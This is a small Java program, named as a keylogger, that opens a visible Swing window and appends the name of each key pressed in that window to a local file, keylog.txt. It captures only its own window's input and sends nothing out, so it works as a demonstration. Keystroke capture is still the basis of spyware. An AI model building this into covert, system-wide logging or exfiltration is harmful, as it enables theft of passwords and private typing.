import javax.swing.JFrame;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.io.FileWriter;
import java.io.IOException;

public class keylogger {
    private static final String LOG_FILE = "keylog.txt";

    public static void main(String[] args) {
        new keylogger().startLogging();
    }

    private void startLogging() {
        // Create a JFrame to capture key events
        JFrame frame = new JFrame("Keylogger");
        frame.setSize(300, 200);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        // Add a KeyAdapter to capture key presses
        frame.addKeyListener(new KeyAdapter() {
            @Override
            public void keyPressed(KeyEvent e) {
                logKey(e);
            }
        });

        frame.setVisible(true);
    }

    private void logKey(KeyEvent e) {
        String key = getKeyText(e);
        logToFile(key);
    }

    private String getKeyText(KeyEvent e) {
        int keyCode = e.getKeyCode();
        return KeyEvent.getKeyText(keyCode);
    }

    private void logToFile(String key) {
        try (FileWriter writer = new FileWriter(LOG_FILE, true)) {
            writer.write(key + "\n");
        } catch (IOException e) {
            System.err.println("Error writing to log file: " + e.getMessage());
        }
    }
}
